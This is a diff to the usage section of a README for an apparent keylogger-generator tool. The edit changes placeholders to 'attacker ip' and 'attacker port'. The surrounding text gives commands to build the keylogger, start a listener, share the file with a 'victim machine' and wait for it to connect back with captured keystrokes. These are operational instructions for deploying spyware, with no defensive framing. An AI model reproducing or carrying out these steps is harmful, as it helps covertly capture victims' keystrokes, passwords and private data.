@@ -19,10 +19,10 @@ pip install -r requirements.txt
 ## Usage:
 ``` 
 ./autoChange.sh
-python3 keyloggerGenerator.py <ip> <port> <keylogger filename>
+python3 keyloggerGenerator.py <attacker ip> <attacker port> <keylogger filename>
 **Before sharing the file, put yourself in listening mode by running the following command**
 cd server
-python3 listener.py <port>
+python3 listener.py <listener port>
 **Remember, the port must be the same port that the victim will use to connect to your computer.**
 Now share the file to the victim machine and wait for it to connect to your server to receive the keystrokes.
 ```
